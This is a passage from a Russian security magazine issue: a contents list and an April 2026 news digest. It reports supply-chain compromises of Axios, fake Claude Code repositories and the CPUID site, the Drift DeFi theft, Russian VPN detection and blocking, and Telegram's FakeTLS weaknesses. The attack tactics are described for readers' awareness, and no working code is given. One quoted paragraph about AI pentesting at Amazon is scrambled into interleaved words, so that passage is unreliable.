
            № 325
CONTENTS


   MEGANews
  Cамые важные события в мире инфосека за апрель

    Самодельные «пальчики»
  Как обманывают сканер отпечатков пальцев

    Охота на жука
  Ищем скрытые камеры и другие шпионские устройства

    Как лгать машине
  Разбираем принципы работы полиграфа и способы обойти проверку

    SQL Privilege Escalation
  Разбираем эскалацию привилегий через базу данных

    Root со звездочкой
  Разбираем принципы атак cron wildcard

    Криптоуравнение
  Решаем нелинейную задачу валидации лицензий и обходим ловушки обфускатора

    Змея в броне
  Реверсим Python-приложения, защищенные обфускатором PyArmor

    b1001 утилит для хакера
  Собираем инструменты для пентестинга

    Указатель в никуда
  Разбираем недавний баг use after free в Chrome

   Жрем мозги ИИ
  Подбираем тулзы для пентеста LLM

    HTB Eighteen
  Захватываем домен через уязвимость BadSuccessor

    HTB AirTouch
  Инсценируем атаку на офисную сеть Wi‑Fi

    HTB Browsed
  Повышаем привилегии в Linux через отравление кеша Python

    HTB Sorcery
  Захватываем домен FreeIPA

    HTB DarkZero
  Захватываем домен через связанные серверы MS SQL

     Delta Chat изнутри
  Как устроен мессенджер, работающий поверх электронной почты

    Мастерская хакeра
  Лезем в недра системы и работаем с файлами

    Go парсить!
  Пишем парсер ARP-кеша, чтобы освоить Golang

    Крипта с нуля
  Выясняем, как устроен блокчейн

    Жадность — это плохо!
  Как скатываются приложения для Android

    Некромантия на минималках
  Оживляем древний Samsung NC110 с помощью Arch Linux и Sway

    Белый хакер
  Глава 24. Вэй Дай
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru

В этом месяце: злоумышленники скомпрометировали npm-
пакет Axios и раздавали RAT разработчикам; Anthropic пред‐
ставила закрытую модель Claude Mythos, которая нашла
тысячи 0-day, но энтузиасты тут же получили к ней доступ;
российские власти развернули масштабную кампанию про‐
тив VPN;  исследователь  Chaotic  Eclipse  объявил  войну
Microsoft и публикует эксплоиты для непропатченных уяз‐
вимостей; у DeFi-платформы Drift украли 285 миллионов дол‐
ларов, а также другие важные и интересные события апреля.





ВЗЛОМ AXIOS
В начале месяца произошла компрометация npm-пакета Axios: злоумыш‐
ленники захватили аккаунт основного мейнтейнера проекта и опубликовали
две вредоносные версии пакета (1.14.1 и 0.30.4), которые устанавливали RAT
на машины разработчиков.
   Axios —  один  из  самых  популярных  HTTP-клиентов  в  экосистеме
JavaScript. Пакет  насчитывает более 83 миллионов  загрузок в неделю
(более 400 миллионов в месяц) и широко  используется как во фрон‐
тенд‑фреймворках, так и в бэкенд‑сервисах и корпоративных приложениях
для управления запросами между клиентами (браузерами или приложениями
Node.js) и серверами.
   Позже мейнтейнер Axios Джейсон Сааймен (Jason Saayman) опубликовал
детальный отчет о произошедшем, а специалисты компании Socket выяснили,
что  атака была частью масштабной  скоординированной кампании,  нап‐
равленной на мейнтейнеров популярных npm-пакетов.
  По словам разработчика, атакующие хорошо подготовились: они клониро‐
вали внешность и бренд основателя реальной известной компании, а затем
пригласили жертву в Slack-воркспейс, замаскированный под эту компанию.
Все выглядело убедительно: в воркспейсе были каналы с публикациями
из LinkedIn, фальшивые профили «сотрудников» и даже других опенсорс‑мей‐
нтейнеров.





Затем злоумышленники назначили Сааймену созвон в Microsoft Teams. Когда
он подключился к звонку, ему показали сообщение об ошибке — якобы что‑то
в  системе  устарело  и  требует  обновления.  Как  только  он  запустил
это «обновление», на его машину установился троян удаленного доступа.
Именно с его помощью хакеры похитили учетные данные от npm, после чего
опубликовали троянизированные версии Axios с малварью WAVESHAPER.V2.
   Аналитики Google Threat Intelligence Group связали эту атаку с группиров‐
кой UNC1069 — финансово мотивированными хакерами из КНДР, активными
как минимум с 2018 года. Тактика, которую злоумышленники применили про‐
тив Сааймена, полностью совпадает с другой кампанией, которую в прошлом
году описывали эксперты компаний Huntress и « Лаборатория Касперского »:
жертве демонстрируют фейковую ошибку при подключении к видеозвонку,
а затем предлагают скачать «обновление» для Zoom или Teams.





Хуже того, как выяснили аналитики Socket, Axios оказался не единственной
целью злоумышленников:  сразу  несколько мейнтейнеров из экосистемы
Node.js независимо друг от друга подтвердили, что их атаковали по тому же
сценарию.
   Среди целей были: мейнтейнер ECMAScript-полифилов Джордан Харбанд
(Jordan Harband), создатель Lodash Джон‑Дэвид Долтон (John-David Dalton),
мейнтейнер Fastify и Undici Маттео Коллина (Matteo Collina), автор dotenv
Скотт Мотт (Scott Motte), а также мейнтейнер Mocha Пелле Вессман (Pelle
Wessman). Кроме того, были атакованы и сами инженеры компании Socket.
  Во всех случаях использовалась одинаковая схема: выход на контакт
с жертвой через LinkedIn или Slack, приглашение в подготовленный заранее
воркспейс, а затем назначение видеозвонка и фейковая ошибка с пред‐
ложением установить «исправление».
  К примеру, Вессман рассказывал, что его пригласили якобы на запись
подкаста через поддельную версию платформы StreamYard. Когда он отказал‐
ся запускать предложенное приложение, хакеры попытались убедить его
выполнить curl-команду в терминале. После повторного отказа злоумыш‐
ленники удалили все переписки и исчезли.
   Эксперты подчеркивают, что после установки RAT на машину жертвы двух‐
факторная аутентификация и OIDC-публикация уже не помогают, так как ата‐
кующие получают доступ к токенам .npmrc, сессиям браузера и keychain.


20% РОССИЙСКИХ КОМПАНИЙ СКОМПРОМЕТИРОВАНЫ
И НЕ ПОДОЗРЕВАЮТ ОБ ЭТОМ
По данным специалистов BI.ZONE, злоумышленники присутствуют в инфраструктуре каждой
пятой компании в РФ, причем без каких‑либо видимых признаков взлома.

60% выявленных случаев скрытого присутствия приходится на кибершпионские группировки
(в отличие от операторов шифровальщиков, шпионы месяцами остаются в инфраструктуре
жертв, незаметно собирая данные). Еще 20% случаев связаны с хактивистами.

Согласно отчету Threat Zone 2026, 37% всех атак на российские организации совершаются
в целях шпионажа.





УТЕЧКА
ИСХОДНИКОВ
CLAUDE CODE
Злоумышленники  создают на GitHub  вредоносные  репозитории,  замас‐
кированные под утекшие исходные коды Claude Code. Системы пользовате‐
лей, скачавших подделку, оказываются заражены инфостилером Vidar и прок‐
си‑инструментом GhostSocks.
  Все началось с того, что компания Anthropic допустила случайную утечку ,
опубликовав полный клиентский исходный код Claude Code. В npm-пакет
попал  JavaScript  source  map  размером  59,8  Мбайт,  содержавший
более 512 тысяч строк необфусцированного TypeScript и около 1900 файлов.
   Утечка раскрыла логику оркестрации агента, его системы разрешений
и исполнения, скрытые функции, детали сборки и внутренние механизмы
безопасности. Код моментально распространился по GitHub, где его форкну‐
ли тысячи раз.
   Как вскоре сообщили исследователи из Zscaler, злоумышленники быстро
воспользовались ажиотажем вокруг этого инцидента. В частности, на GitHub
был обнаружен репозиторий пользователя idbzoomh. Инструмент в репози‐
тории выдавал себя за форк исходников Claude Code с «разблокированными
корпоративными функциями» и без лимитов на сообщения. В README про‐
екта утверждалось, что код извлечен из .map-файла npm-пакета.





Репозиторий был оптимизирован для поисковых систем и некоторое время
отображался в числе первых результатов в поиске Google по запросу leaked
claude code.





В итоге пользователи, попавшиеся на удочку злоумышленника, загружали
архив 7-Zip с названием Claude Code — Leaked Source Code, содержащий
написанный на Rust дроппер ClaudeCode_x64.exe. После запуска он устанав‐
ливал  на  машину   жертвы   сразу  две   угрозы:  инфостилер   Vidar
v18.7 и GhostSocks.
   Также исследователи нашли второй репозиторий с идентичным кодом, где
вместо архива была кнопка Download ZIP, однако на момент проведения ана‐
лиза она не работала.
  В Zscaler полагают, что за обоими репозиториями стоит один и тот же ата‐
кующий, экспериментирующий со способами доставки малвари.
   Стилер Vidar собирал в зараженной системе учетные данные, данные бан‐
ковских карт и историю браузера. GhostSocks, в свою очередь, превращал
зараженное устройство в резидентный прокси, позволяющий хакерам мас‐
кировать свое реальное местоположение и заниматься дальнейшей вре‐
доносной активностью.
   Исследователи отмечают, что вредоносный архив регулярно обновлялся,
так что в будущем в него могут добавить дополнительные пейлоады.
   Примечательно, что в марте 2025 года специалисты ИБ‑компании Huntress
предупреждали о похожей вредоносной кампании. Тогда злоумышленники
использовали в качестве приманки OpenClaw и точно так же распространяли
связку Vidar и GhostSocks через GitHub-репозитории.


6 000 000 FTP-СЕРВЕРОВ ДОСТУПНЫ ИЗ ИНТЕРНЕТА,
ПОЧТИ ПОЛОВИНА — БЕЗ ШИФРОВАНИЯ
Аналитики компании Censys обнаружили в сети около 6 000 000 систем с FTP, доступных
извне.

Хотя протоколу уже больше 50 лет, он по‑прежнему встречается на 2,72% всех «видимых»
в интернете  хостов. При этом число таких систем сократилось на 40% с 2024 года —
с 10 100 000 до 5 940 000 .





Главная проблема FTP — шифрование, а точнее, его отсутствие. У 2 450 000 сервисов
не зафиксировано никаких признаков TLS-хендшейка. Из них 994 000 не поддерживают AUTH
TLS, 813 000 запрашивают пароль до установки защищенного соединения, а более 170 000
лишены поддержки Explicit TLS.

Больше всего FTP-хостов нашли в США ( 1 200 000 ), за ними идут Китай ( 866 000 ), Германия
( 467 000 ) и Гонконг ( 415 000 ).





Самый популярный серверный софт — Pure-FTPd  ( 1 990 000 сервисов), за ним следует
ProFTPD ( 812 000 ) и vsftpd ( 379 000 ). На Microsoft IIS FTP приходится 259 000 сервисов.





КАМПАНИЯ ПРОТИВ
VPN
В апреле 2026 года российские власти резко усилили давление на VPN-сер‐
висы. Теперь VPN обнаруживают и  блокируют даже через  крупнейшие
интернет‑платформы страны.
  В конце марта глава Минцифры Максут Шадаев провел серию совещаний
с руководителями более 20 крупных российских компаний, среди которых
были «Сбер», «Яндекс», VK, Wildberries, Ozon, «Авито», X5 и другие.
  В ведомстве потребовали, чтобы к 15 апреля компании обеспечили
неработоспособность сервисов для пользователей с включенным VPN. Пло‐
щадкам пообещали передать список уже выявленных Роскомнадзором VPN-
адресов, а также «методичку» по самостоятельному обнаружению и бло‐
кировке VPN-сервисов (в том числе тех, которые регулятор ранее не иден‐
тифицировал и не обнаруживал).
   Новые VPN, обнаруженные таким образом, компании будут обязаны
передавать специалистам Роскомнадзора для включения в общий список
блокировок. По задумке властей, это позволит блокировать и будущие VPN-
сервисы.
   Как сообщали СМИ, за неисполнение этого указания предусмотрены
серьезные санкции: исключение из ИТ‑реестра Минцифры (это означает
потерю  налоговых  льгот,  пониженных  страховых  взносов,  ИТ‑ипотеки
и отсрочки от армии для сотрудников), исключение из «белых списков», а так‐
же лишение права на предустановку приложений на продающиеся в РФ
устройства.
   Также сообщалось, что ФСБ может получить полномочия инициировать
лишение  аккредитации  компаний  за  «нарушения  требований ИБ» —
под которыми, по сути, подразумевается пропуск VPN-трафика.
   Кроме того, на совещаниях с представителями бизнеса Максут Шадаев
попросил операторов связи ввести плату за международный трафик свы‐
ше 15 Гбайт, а крупные цифровые платформы — ограничить доступ к сер‐
висам для пользователей, заходящих через VPN. Тогда все источники СМИ
сходились во мнении, что инициатива, скорее всего, связана с закрытым
поручением президента.
   Отметим, что в середине апреля телекоммуникационные компании об‐
ратились в Минцифры с просьбой перенести сроки введения дополнитель‐
ной  платы за использование более 15 Гбайт международного трафика
в месяц на мобильных сетях. Дело в том, что операторы оказались технически
не готовы к запуску механизма в намеченный срок — 1 мая 2026 года.
  Сам Шадаев назвал обсуждаемые меры «сложным компромиссом» и под‐
черкнул,  что идея  прямой  административной  ответственности  граждан
за использование VPN ведомству «категорически не нравится», однако «все
другие варианты сильно хуже».
   Вскоре после этого в сети появился документ , по содержанию совпада‐
ющий с описанной СМИ «методичкой». Он предлагает трехэтапную схему
детектирования  средств  обхода  блокировок:  серверную  проверку  IP
по GeoIP-базам и репутационным спискам, анализ на мобильных устройствах
через  системные  API  (на  Android —  ConnectivityManager  и  флаги
TRANSPORT_VPN, на iOS возможности существенно ограничены из‑за песоч‐
ницы Apple), а на десктопах — анализ сетевых интерфейсов, таблиц маршру‐
тизации и значений MTU. Среди более экзотических методов в документе
упоминается SNITCH — замер RTT между клиентом и сервером для выяв‐
ления аномальных задержек, характерных для VPN-туннелей.
  По оценкам аналитиков, совокупные годовые затраты задействованных
компаний на блокировку VPN-трафика могут составить около 15 миллиардов
рублей.
   Проведенное в середине месяца исследование RKS Global показало,
что 22 из 30 популярных российских Android-приложений уже умеют обна‐
руживать VPN, а 19 из них передают VPN-статус на свои серверы.
   Лидерами  оказались  «Яндекс  Браузер»  и  «Яндекс  Карты»,  каждое
из которых использует четыре метода детектирования из шести возможных.
При этом «Яндекс Браузер» дополнительно ищет на устройстве Tor Browser,
а приложения «Самокат» и MegaMarket получают полный список установ‐
ленных VPN-приложений.





                                     Продолжение статьи →
← Начало статьи

   Банковские приложения («Т‑Банк», «Сбербанк Онлайн» и ВТБ) оказались
  самой агрессивной группой по уровню слежки: они собирают расширенный
   фингерпринтинг, включая перехват касаний экрана с координатами и дав‐
   лением, а  также обнаруживают  инструменты реверс‑инжиниринга вроде
   Frida.
      Эксперты предупреждают о серьезных побочных эффектах принимаемых
  мер. В частности, о связанных с блокировками проблемах говорит президент
  ГК InfoWatch и сооснователь «Лаборатории Касперского» Наталья Каспер‐
   ская. В апреле она дважды публично выступила с критикой подхода властей
   к блокировкам.
    По словам Касперской, VPN-трафик технически крайне сложно отличить
   от обычного HTTPS и чем агрессивнее РКН блокирует средства обхода, тем
  хуже работает интернет в целом — сбои фиксировались практически ежед‐
  невно на протяжении всего апреля.
    В своих публикациях Касперская указала, что надежного способа отличить
   корпоративный VPN от «обычного» не существует, а россияне за рубежом уже
   столкнулись с невозможностью пользоваться «Госуслугами» и онлайн‑бан‐
   ками. При этом «белые списки» РКН охватывают около 1730 организаций —
  менее процента от трех миллионов юридических лиц в стране.
      Отдельно она подчеркнула, что блокировки бьют по ИТ‑отрасли: раз‐
   работчики зависят от  иностранных  репозиториев, ИИ‑моделей и open-
   source-библиотек, а зарубежные платформы нередко сами блокируют доступ
  с российских IP, и VPN остается единственным способом продолжать работу.
    По данным Касперской, если в конце марта в России насчитывалось око‐
  ло 4000 доступных VPN-сервисов, то к середине апреля их  стало уже
  более 6000.
    В итоге 22 апреля ассоциация «Отечественный софт» (АРПП) направила
   письмо председателю правительства и руководителю администрации пре‐
   зидента. Общий вывод АРПП, изложенный в десятистраничном документе,
   совпадает с позицией Касперской: блокировать VPN бессмысленно и даже
   вредно, а социальную проблему нельзя решить техническими средствами.


 ИИ В ПЕНТЕСТИНГЕ





   Си‑Джей Мозес (CJ Moses), директор по информационной безопасности Amazon Integrated
    Security, в интервью на конференции RSA рассказал, что теперь компания использует ИИ‑инс‐
    трументы для пентестинга своих продуктов и добилась прироста эффективности более чем
   на 40%.
      По его словам, раньше Amazon тратила «миллионы и миллионы долларов» на пентестеров,
   но все равно не могла нанять достаточно специалистов. Теперь ИИ тестирует продукты неп‐
   рерывно, в том числе после релиза, хотя окончательные решения по‑прежнему принимают
   люди.→МозесИИсравнилотличноспособностьсправляетсяИИс задачами,приниматькогдарешениянужнос навыкамиобработатьсемилетнегоогромные мас‐ребенка:
         сивы данных и увидеть общую картину. Но если говорить о принятии решений —
        мы пока не готовы на него полагаться. По уровню суждений ИИ сейчас пример‐
         но как семилетний ребенок. Так что если вы готовы доверить семилетке
         решение о переходе к следующему  этапу  пентеста в вашей компании —
           пожалуйста. Но, возможно, вы предпочтете, чтобы этим занимался кто‑то стар‐
        ше и опытнее.





 ОТКЛЮЧЕНИЕ
 ПОПОЛНЕНИЯ
 БАЛАНСА APPLE ID
   Компания Apple официально подтвердила , что с 1 апреля 2026 года обработ‐
   ка платежей для покупок в App Store и других сервисах Apple Media больше
  не доступна в России.
      Ограничения затронули весь спектр сервисов компании: Apple Music,
   Apple Arcade, Apple TV, Apple One, iCloud+, iTunes Store, подписки на подкасты,
  а также покупки рингтонов и звуков.
      Если на балансе аккаунта уже есть средства, покупки и продление под‐
  писок по‑прежнему доступны (пока деньги не закончатся). Также можно акти‐
   вировать промокоды App Store. Ранее приобретенные приложения и контент
   останутся доступными, и обновления для уже установленных приложений,
   вероятно, тоже продолжат приходить.
      Если Apple не сможет списать  оплату, подписка будет аннулирована
  и пользователь потеряет доступ к контенту. Однако в компании сделали
   исключение для iCloud+ — данные в облаке останутся доступными даже пос‐
  ле окончания подписки. Пользователи смогут управлять хранилищем, ска‐
   чивать фото и видео. При этом в компании подчеркивают, что это условие
   сохранится исключительно для аккаунтов с привязкой к РФ.
     Важный нюанс: после завершения подписки iCloud+ объем хранилища
   упадет до бесплатных 5 Гбайт. Если накопленные данные превышают этот
   лимит, загружать новые файлы, фото и видео уже не получится. Это затронет
   синхронизацию,  работу  почты  iCloud  и  другие  сервисы,  связанные
  с облачным хранилищем.
     Как ранее сообщали СМИ , отключение обработки платежей стало следс‐
   твием решения Минцифры. На совещании 28 марта глава ведомства Максут
  Шадаев поручил операторам «большой четверки» прекратить пополнение
   баланса Apple ID с мобильных счетов.
     Среди причин введения запрета источники называли борьбу с оплатой
   VPN-сервисов через Apple ID, а также стремление надавить на компанию,
  которая с 2022 года удалила из российского App Store десятки приложе‐
  ний — банковских, картографических и других.
    В частности, сообщалось, что в Минцифры хотят побудить Apple выполнять
   требования российского законодательства: дать пользователям выбирать
   поисковик по умолчанию, разрешить установку RuStore и снять ограничения
  на альтернативные способы оплаты.


  4 000 000 РУБЛЕЙ ШТРАФОВ ВЫПИСАЛИ ОПЕРАТОРАМ
 СВЯЗИ
  С октября 2025 года по март 2026-го Роскомнадзор оформил материалы в отношении 28 опе‐
   раторов связи за нарушение требований о пропуске трафика через ТСПУ (технические средс‐
   тва противодействия угрозам).

  В 15 случаях суды назначили штрафы на общую сумму 4 000 000 рублей , в 5 — ограничились
   предупреждениями.


   Операторы обязаны пропускать весь интернет‑трафик через ТСПУ с 1 января 2023 года.
   За нарушение юридическим лицам грозит штраф от 500 000 до 1 000 000 рублей , а при
   повторном — от 3 000 000 до 5 000 000 рублей .





 У DRIFT УКРАЛИ
 285 МИЛЛИОНОВ
 ДОЛЛАРОВ
    Drift Protocol потерял 285 миллионов долларов в результате атаки северо‐
   корейских хакеров, которая готовилась более полугода. Злоумышленники
  из группировки UNC4736 провели масштабную операцию с использованием
   социальной инженерии, выстраивая доверительные отношения с контрибь‐
   юторами проекта с осени 2025 года.
        Drift Protocol представляет собой DeFi-платформу на блокчейне Solana,
  работающую как некастодиальная биржа, где трейдеры сохраняют полный
   контроль над своими средствами. По состоянию на конец 2024 года плат‐
  форма насчитывала 200 тысяч трейдеров, а совокупный объем торгов пре‐
  вышал 55 миллиардов долларов.
      Согласно официальному заявлению  Drift, подготовка к атаке началась
  еще 11 марта. Тогда злоумышленники вывели 10 ETH из Tornado Cash и на эти
   средства создали полностью фиктивный токен CarbonVote Token (CVT) —
  750 миллионов единиц.
    На децентрализованной бирже Raydium хакеры создали пул ликвидности,
  добавив в него всего 500 долларов, и на протяжении нескольких недель нак‐
   ручивали объемы с помощью wash-трейдинга (фейковых сделок с самими
   собой), искусственно удерживая цену CVT около 1 доллара. Ценовые оракулы
    Drift приняли эту историю торгов за реальную и начали воспринимать CVT
   как легитимный актив.
      Параллельно с этим, с 23 по 30 марта, атакующие создали аккаунты
   durable nonce. Durable nonce — это легитимный механизм Solana, который
   позволяет подписать транзакцию заранее и исполнить ее позже, минуя стан‐
   дартное окно экспирации (обычно 60–90 с).
    С помощью социальной инженерии хакеры убедили двух из пяти членов
   Security Council подписать транзакции, которые выглядели рутинными, и этого
   хватило для преодоления порога мультиподписи.
      Критическую роль сыграл и тот факт, что 27 марта в Drift провели плановую
   миграцию Security Council и убрали timelock — задержку на исполнение адми‐
   нистративных действий, которая обычно дает сообществу 24–72 ч на обна‐
   ружение подозрительной активности.
     1 апреля все перечисленное выше сработало вместе. Сначала был про‐
   изведен тестовый вывод, а через минуту атакующие запустили заранее под‐
   писанные транзакции durable nonce и перехватили административный кон‐
   троль.
      Получив привилегии, они добавили CVT в качестве допустимого залого‐
  вого актива в Drift, подняли лимиты вывода до огромных значений (500 трил‐
  лионов — фактически отключив защиту) и внесли сотни миллионов токенов
  CVT в качестве залога. На основании сфабрикованной оракулами цены этот
   залог выглядел ценным, и хакеры вывели реальные активы, включая USDC,
  JLP и другие токены, использовав 31 транзакцию, на что ушло всего 12 мин.
    По оценкам Drift, итоговые потери составили около 280 миллионов дол‐
   ларов, хотя блокчейн‑аналитики PeckShield оценили ущерб в 285 миллионов
   долларов.





  При этом в Drift подчеркивают, что уязвимостей в смарт‑контрактах или прог‐
  раммном коде платформы обнаружено не было, а seed-фразы скомпромети‐
   рованы не были.
      Вскоре специалисты компаний  Elliptic и TRM Labs связали эту  атаку
  с хакерами из КНДР на основе ончейн‑индикаторов: использование Tornado
   Cash, паттерны кросс‑чейн‑бриджинга и быстрое отмывание средств, харак‐
  терные для северокорейских группировок.
      Ответственность за этот инцидент эксперты с умеренной степенью уве‐
   ренности возлагают на UNC4736 (она же AppleJeus, Citrine Sleet, Golden
   Chollima и Gleaming Pisces). Эта хакгруппа атакует криптовалютный сектор
   как минимум с 2018 года и наиболее известна по атаке на цепочку пос‐
   тавок 3CX в 2023 году и взлому DeFi-платформы Radiant Capital на 53 мил‐
  лиона долларов в октябре 2024 года.
      Также стали известны подробности атак с применением социальной инже‐
   нерии, которые хакеры вели с осени 2025 года. Они представлялись сот‐
   рудниками трейдинговой компании и выходили на контакт с контрибьюторами
    Drift на крупных криптоконференциях. Злоумышленники были технически под‐
   кованны, имели профессиональный бэкграунд, который можно было про‐
   верить, и хорошо разбирались в устройстве Drift.
      После знакомства общение продолжалось в Telegram — месяцы пред‐
  метных разговоров о торговых стратегиях и интеграции с протоколом.


          Люди, лично встречавшиеся с нашими контрибьюторами, не были
         гражданами Северной Кореи, —  пояснили  представители  Drift. — «
        Но хакеры из КНДР, работающие на таком уровне, известны тем, что
          привлекают сторонних посредников для выстраивания личных отно‐
        шений с жертвами.                 »
  В период с декабря 2025-го по январь 2026 года группировка развернула
   в Drift собственный Ecosystem Vault, заполнила форму с описанием стратегии
  и внесла более 1 миллиона долларов собственных средств. Все ради того,
   чтобы укрепить доверие и закрепиться внутри экосистемы. Подставные лица
   продолжали общение с контрибьюторами вплоть до самого момента атаки.
      Расследование выявило два вероятных вектора компрометации. Так, один
  из контрибьюторов мог быть скомпрометирован после клонирования репози‐
  тория с кодом, предоставленного злоумышленниками. Второй контрибьютор
   установил некий кошелек через Apple TestFlight, якобы для бета‑тестирова‐
   ния.
    В результате атаки пострадали депозиты borrow/lend, средства в хранили‐
  щах и торговые фонды. В итоге все функции протокола были заморожены,
   хотя в Drift отмечают, что DSOL не затронут, а средства страхового фонда
  защищены.


  21 000 000 000 ДОЛЛАРОВ США ПОТЕРЯЛИ
 АМЕРИКАНЦЫ ИЗ-ЗА КИБЕРПРЕСТУПЛЕНИЙ
   По данным ФБР, жертвы киберпреступлений в США потеряли почти 21 000 000 000 дол‐
  ларов США за 2025 год — на 26% больше, чем в 2024 году.





   Центр приема жалоб на интернет‑преступления (IC3) получил более 1 000 000 обращений
    против 859 000 годом ранее.





   На инвестиционное мошенничество пришлось 49% всех случаев, и оно принесло жертвам
    убытки на 8 600 000 000 долларов США .

   Крупнейшие потери связаны с криптовалютными схемами — свыше 11 000 000 000 дол‐
  ларов США по 181 565 делам.

   Сильнее всего от киберпреступников страдают американцы старше 60 лет: их убытки сос‐
   тавили 7 700 000 000 долларов США (рост на 37%).





  В этом году ФБР впервые посвятило отдельный раздел в отчете преступлениям с исполь‐
   зованием ИИ. На них пришлось 22 300 жалоб и убытки в размере 893 000 000 долларов
  США . Мошеннические схемы с ИИ включали клонирование голоса, дипфейк‑видео и подделку
   документов.





 TELEGRAM
 АДАПТИРУЕТСЯ
  В своем Telegram-канале Павел Дуров заявил, что 65 миллионов россиян
   пользуются Telegram через VPN, и пообещал, что команда мессенджера
   «продолжит адаптироваться», затрудняя обнаружение и блокировку трафика.
   Однако сообщество разработчиков утверждает, что в реальности команда
   Telegram не сделала для обхода блокировок практически ничего, а всю
  работу выполнили энтузиасты.


         Telegram заблокировали в России — но 65 миллионов россиян все
          равно пользуются им ежедневно через VPN, и более 50 миллионов «
         отправляют сообщения каждый день, — написал Дуров. — С нашей
          стороны мы продолжим адаптироваться — делая трафик Telegram
         сложнее для обнаружения и блокировки.                 »





  В том же посте Дуров упомянул Иран, где Telegram тоже заблокирован,
  но 50 миллионов человек продолжают пользоваться мессенджером, и поп‐
   риветствовал российских пользователей «в цифровом сопротивлении».
      Однако эта публикация вызвала резкую критику со стороны сообщества.
  Как  указал автор детального разбора ситуации на « Хабре » под ником
   David_Osipov, реализация FakeTLS в Telegram содержала грубые ошибки,
  которые позволяли ТСПУ тривиально идентифицировать трафик мессендже‐
   ра. При этом код mtproto_tls_socket.cpp не менялся с ноября 2025 года, а ког‐
  да ТСПУ начали блокировать прокси, разработчики Telegram никак на это
  не отреагировали.
    По словам автора статьи, проблему решили участники сообщества, свя‐
   занного с прокси‑сервером Telemt. Они проанализировали TLS-хендшейки,
   обнаружили конкретные аномалии Drift в пакетах (например, использование
   несуществующего идентификатора расширения и некорректную длину ключа
   X25519) и подготовили исправления. Все находки они оформили в pull request,
  который прошел ревью внутри сообщества еще до того, как его увидела офи‐
   циальная команда.
      Мейнтейнер десктопного клиента Telegram принял минимальный набор
   изменений из PR с комментарием  Inspired by wide  internet  discussions.
  При этом он подтвердил, что библиотека tdlib содержит те же ошибки, а зна‐
   чит, клиенты для iOS и Android по‑прежнему уязвимы для детектирования.
   Стоит отметить, что на момент публикации сообщения Дурова патч получил
   только десктопный клиент.
      Также автор разбора подчеркивает, что принятые исправления лишь хот‐
   фикс, а не полноценное решение. Реализация FakeTLS в Telegram содержит
  и другие проблемы: фиксированный размер ClientHello, устаревшие рас‐
  ширения, предсказуемые тайминги между пакетами и несоответствие заяв‐
   ленного протокола фактическому трафику. После хендшейка Telegram дек‐
   ларирует HTTP/2, но передает чистый MTProto, а для продвинутого анализа
   это самостоятельная сигнатура.
      Участники сообщества уже подготовили аналогичный патч и для iOS-кли‐
   ента. Как отметил один из энтузиастов, сообщество боролось не за «циф‐
  ровое сопротивление», а за то, чтобы обычные люди могли продолжать поль‐
   зоваться удобным мессенджером, в котором «миллионы пересылают котиков
  и обсуждают в домовом чате, кто загадил лифт».


  213 УЯЗВИМОСТЕЙ НАШЛИ БЕЛЫЕ ХАКЕРЫ
 В МЕССЕНДЖЕРЕ MAX
  В рамках программы bug bounty, запущенной 1 июля 2025 года, исследователи подали 213
    отчетов об уязвимостях в мессенджере Max.

   Суммарно на платформе Standoff365 было принято 288 отчетов из 454 поданных, а общая
   сумма выплат составила почти 22 000 000 рублей при средней награде в 349 000 рублей .


   На двух других площадках (BI.ZONE и «Киберполигон») исследователям в сумме выплатили око‐
   ло 1 500 000 рублей .

   Самый частый вектор найденных уязвимостей — IDOR (Insecure Direct Object Reference), поз‐
   воляющий получить доступ к чужим данным через подмену идентификатора объекта в запросе.





                                        Продолжение статьи →
← Начало статьи
 CPUID ВЗЛОМАЛИ
 И РАЗДАЛИ МАЛВАРЬ
  Сайт  проекта  CPUID,  распространяющего  такие  популярные  утилиты,
   как CPU-Z, HWMonitor, HWMonitor Pro и PerfMonitor, скомпрометировали. Око‐
  ло суток все ссылки на загрузку вели на вредоносные сборки, которые в итоге
   разворачивали на машинах жертв RAT под названием STX.
     Первыми на проблему обратили внимание пользователи Reddit, которые
   заметили,    что    официальный    портал    отдает    странный   файл
  HWiNFO_Monitor_Setup — инсталлятор на базе Inno Setup с интерфейсом
  на русском языке. То есть вместо утилиты от CPUID загружалась подделка
  под совершенно другой продукт (HWiNFO) от стороннего разработчика. Пря‐
  мые ссылки на бинарники при этом продолжали работать, так как злоумыш‐
   ленники подменили только публичные ссылки для загрузки.
      Вскоре представители CPUID подтвердили факт атаки и пояснили, что
   расследование инцидента еще продолжается, но, судя по всему, злоумыш‐
   ленники получили доступ к «вспомогательной функции, по сути, второстепен‐
  ному API». Из‑за этого ресурс случайным образом показывал посетителям
   вредоносные ссылки, а оригинальные подписанные бинарники не постра‐
   дали. В компании также отметили, что взлом пришелся на период, когда
  основной разработчик проекта находился в отпуске.
    По информации аналитиков « Лаборатории Касперского », инцидент длился
  с 15:00 UTC 9 апреля примерно до 10:00 UTC 10 апреля. В это время через
   сайт распространялись зараженные версии:
   • CPU-Z 2.19;
   • HWMonitor Pro 1.57;
   • HWMonitor 1.63;
   • PerfMonitor 2.04.

   Малварь предлагалась как в виде ZIP-архивов, так и в виде отдельных уста‐
   новщиков. Внутри содержался легитимный подписанный исполняемый файл,
  а также вредоносная библиотека CRYPTBASE.dll, подгружавшаяся через тех‐
   нику DLL sideloading.
     DLL отвечала за связь с управляющим сервером атакующих и запуск
   дополнительных пейлоадов, предварительно проверяя, не запущена ли она
   в песочнице. Финальной полезной нагрузкой служил вредонос STX RAT.
     STX RAT, кроме того что крадет данные, поддерживает создание скрытого
   удаленного рабочего  стола (HVNC), выполнение exe-, DLL-, PowerShell-
  и шелл‑кода в памяти, проксирование и туннелирование трафика через
   зараженную машину,  а  также  позволяет  своим  операторам  управлять
  рабочим столом жертвы.
      Исследователи отметили, что адрес управляющего сервера и конфигура‐
  ция подключения в этой атаке полностью совпали с индикаторами мартов‐
  ской вредоносной кампании , в рамках которой через фейковые сайты раз‐
  давались поддельные инсталляторы FileZilla.
    По оценкам экспертов, малварь успели загрузить более 150 пользовате‐
   лей. В основном это были частные лица, но среди жертв оказались и орга‐
   низации из сфер розничной торговли, производственного сектора,  кон‐
   салтинга, телекома и сельского хозяйства. Большая часть заражений приш‐
  лась на Бразилию, Россию и Китай.
      Разработчики CPUID уже устранили проблему, и сайт снова распростра‐
   няет безопасные версии утилит.


  ТОРВАЛЬДС О КАЧЕСТВЕ ИИ-РЕВЬЮ КОДА





   Линус Торвальдс (Linus Torvalds) высоко оценил качество ИИ‑инструментов для анализа кода
   ядра Linux.
     В  рассылке  intel-gfx  (списке  рассылки  разработчиков  графической  подсистемы  Intel
